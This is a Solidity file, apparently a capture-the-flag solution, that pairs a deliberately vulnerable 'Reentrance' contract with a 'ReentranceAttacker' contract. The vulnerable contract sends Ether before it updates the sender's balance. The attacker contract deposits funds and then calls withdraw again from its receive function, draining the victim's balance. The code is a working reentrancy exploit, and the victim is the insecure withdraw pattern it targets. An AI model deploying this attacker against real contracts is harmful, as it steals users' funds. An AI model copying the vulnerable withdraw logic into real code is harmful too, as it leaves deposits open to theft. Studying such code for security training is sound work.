// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import '@openzeppelin/contracts/utils/ReentrancyGuard.sol';
import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if (balances[msg.sender] >= _amount) {
      (bool result, ) = msg.sender.call{value: _amount}('');
      if (result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract ReentranceAttacker {
  Reentrance victim;

  constructor(address victim_) public {
    victim = Reentrance(payable(address(victim_)));
  }

  function attack() external payable {
    require(msg.value != 0);

    victim.donate{value: msg.value}(address(this));

    victim.withdraw(msg.value);
  }

  receive() external payable {
    if (address(victim).balance > 0) {
      victim.withdraw(msg.value);
    }
  }
}
